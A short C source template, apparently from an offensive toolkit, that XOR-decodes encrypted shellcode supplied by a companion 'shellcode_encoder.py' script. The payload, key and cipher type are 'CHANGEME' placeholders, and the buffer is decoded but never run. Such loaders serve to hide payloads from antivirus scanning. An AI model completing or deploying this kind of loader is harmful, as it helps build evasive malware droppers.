int main() {
    // Encrypted shellcode and cipher key obtained from shellcode_encoder.py

    char encryptedShellcode[] = "CHANGEME";
    char key[] = "CHANGEME";
    char cipherType[] = "CHANGEME";

    // Char array to host the deciphered shellcode
    char shellcode[sizeof encryptedShellcode];


    // XOR decoding stub using the key defined above must be the same as the encoding key
    int j = 0;
    for (int i = 0; i < sizeof encryptedShellcode; i++) {
        if (j == sizeof key - 1) j = 0;

        shellcode[i] = encryptedShellcode[i] ^ key[j];
        j++;
    }

}
